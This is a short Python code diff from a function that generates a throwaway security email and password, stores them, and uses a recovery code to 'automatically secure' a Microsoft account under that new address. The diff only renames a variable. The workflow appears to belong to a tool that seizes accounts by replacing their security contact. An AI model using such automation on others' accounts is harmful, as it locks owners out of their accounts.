@@ -141,13 +141,13 @@ async def secure(session: httpx.AsyncClient, recovery: bool, accountInfo: dict):
             security_email = uuid.uuid4().hex[:16]
             password = uuid.uuid4().hex[:12]
 
-            email_token, security_email = await generateEmail(security_email, password)
+            type, security_email = await generateEmail(security_email, password)
 
             print(f"[+] - Generated Security Email ({security_email})")
             database.addEmail(security_email, password)
 
             print("[~] - Automaticly Securing Account...")
-            data = await recover(session, mainEmail, recovery_code, security_email, password, email_token) 
+            data = await recover(session, mainEmail, recovery_code, security_email, password, type)
 
             if data and data != "invalid":
                 accountInfo["microsoft"]["security_email"] = security_email
